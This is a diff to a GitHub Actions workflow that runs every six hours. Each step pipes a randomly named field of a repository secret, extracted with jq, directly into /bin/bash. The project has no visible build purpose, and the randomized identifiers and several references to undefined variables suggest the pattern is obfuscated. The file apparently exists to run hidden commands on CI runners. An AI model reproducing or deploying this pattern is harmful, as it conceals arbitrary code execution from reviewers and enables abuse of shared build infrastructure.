@@ -3,22 +3,23 @@ name: limiaozhen5421
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
+    - cron: '33 5/6 * * *'
 
-jobs:  # 9421
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: limiaozhen5421
         env:
-          ts896: ${{ secrets.ts896 }}
+          xv3916: ${{ secrets.xv3916 }}
         run: |
-          echo $ts896 | jq -r .j13563 | /bin/bash
-          echo $dvk04 | jq -r .o380 | /bin/bash
-          echo $jfqci876 | jq -r .ng45774 | /bin/bash
-          echo $y00168 | jq -r .lh68220 | /bin/bash
-          echo $v12679 | jq -r .u29 | /bin/bash
-          echo $lnx9 | jq -r .ao7946 | /bin/bash
-          echo $ergq31402 | jq -r .w98784 | /bin/bash
+          echo $xv3916 | jq -r .ozg47 | /bin/bash
+          echo $tfpa25173 | jq -r .oboc27 | /bin/bash
+          echo $pash850 | jq -r .xtzy1 | /bin/bash
+          echo $domm1 | jq -r .mzu113 | /bin/bash
+          echo $k48345 | jq -r .no906 | /bin/bash
+          echo $p13 | jq -r .vu017 | /bin/bash
+          echo $ft89304 | jq -r .btg308 | /bin/bash
+          echo $xbx7750 | jq -r .dfdn92 | /bin/bash
 
